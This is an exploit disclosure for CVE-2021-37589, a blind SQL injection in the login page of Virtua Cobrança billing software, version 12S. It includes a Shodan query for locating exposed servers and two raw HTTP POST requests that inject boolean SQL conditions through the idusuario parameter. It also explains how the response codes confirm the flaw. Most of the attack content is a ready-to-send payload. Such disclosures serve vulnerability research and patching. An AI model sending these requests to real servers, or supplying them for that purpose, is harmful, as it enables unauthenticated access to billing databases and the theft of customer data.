# CVE-2021-37589

------------------------------------------------------------------------
- Exploit Title: Virtua Software Cobrança - Firebird Blind SQL Injection
- Shodan Query: http.favicon.hash:876876147
- Date: 13/08/2021
- Exploit Author: Luca Regne
- Vendor Homepage: https://www.virtuasoftware.com.br/
- Software Link: https://www.virtuasoftware.com.br/downloads/Cobranca12S_13_08.exe
- Version: 12S
- Tested on: Windows Server 2019
- CVE : CVE-2021-37589
------------------------------------------------------------------------


## Description 
A Blind SQL injection vulnerability in a Login Page (/controller/login.php) in Virtua Cobranca in 12S version allows remote unauthenticated attackers to get information about application executing arbitrary SQL commands by idusuario parameter. 

## Request PoC
```
POST /controller/login.php?acao=autenticar HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 37
Connection: close
Cookie: origem_selecionado=; PHPSESSID=

idusuario='&idsenha=awesome_and_unprobaly_password&tipousr=Usuario

```

This request causes an error 500. Changing the idusuario to "'+AND+'1'%3d'1'--" the response to request was 200 status code with message of authentication error. 

```
POST /controller/login.php?acao=autenticar HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 37
Connection: close
Cookie: origem_selecionado=; PHPSESSID=

idusuario='+AND+'1'='1'--&idsenha=a&tipousr=Usuario

```
